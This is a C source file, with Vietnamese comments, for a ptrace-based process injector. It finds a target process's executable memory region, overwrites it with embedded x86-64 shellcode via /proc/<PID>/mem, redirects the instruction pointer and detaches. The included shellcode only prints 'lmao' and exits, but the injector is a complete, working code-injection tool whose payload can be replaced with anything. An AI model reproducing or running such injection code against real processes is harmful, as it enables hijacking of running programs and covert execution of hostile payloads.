#include <sys/ptrace.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>

unsigned char shellcode[] =
    "\x48\xB8\x6C\x6D\x61\x6F\x0A\x00\x00\x00\x50\x48\xC7\xC0\x01\x00\x00\x00"
    "\x48\xC7\xC7\x01\x00\x00\x00\x48\x89\xE6\x48\xC7\xC2\x05\x00\x00\x00\x0F"
    "\x05\x48\xC7\xC0\x3C\x00\x00\x00\x48\x31\xFF\x0F\x05";

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage: sudo %s <PID>\n", argv[0]);
        return 1;
    }
    pid_t pid = atoi(argv[1]);
    struct user_regs_struct regs;
    char path[64], line[256];
    unsigned long addr = 0;

    // Tìm địa chỉ vùng nhớ thực thi (r-xp)
    sprintf(path, "/proc/%d/maps", pid);
    FILE *f = fopen(path, "r");
    while (fgets(line, sizeof(line), f)) {
        if (strstr(line, "r-xp")) {
            sscanf(line, "%lx-", &addr);
            break;
        }
    }
    fclose(f);

    if (addr == 0) {return 1;}

    // attach
    ptrace(PTRACE_ATTACH, pid, NULL, NULL) ;
    waitpid(pid, NULL, 0);

    // Ghi shellcode
    sprintf(path, "/proc/%d/mem", pid);
    int fd = open(path, O_WRONLY);
    if (fd < 0) {
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return 1;
    }
    pwrite(fd, shellcode, sizeof(shellcode), addr);
    close(fd);

    // Lấy regs, thay đổi RIP
    ptrace(PTRACE_GETREGS, pid, NULL, &regs);
    regs.rip = addr;
    regs.rax = -1;
    ptrace(PTRACE_SETREGS, pid, NULL, &regs);

    // detach
    ptrace(PTRACE_DETACH, pid, NULL, NULL);

    printf("Injected!\n");
    return 0;
}
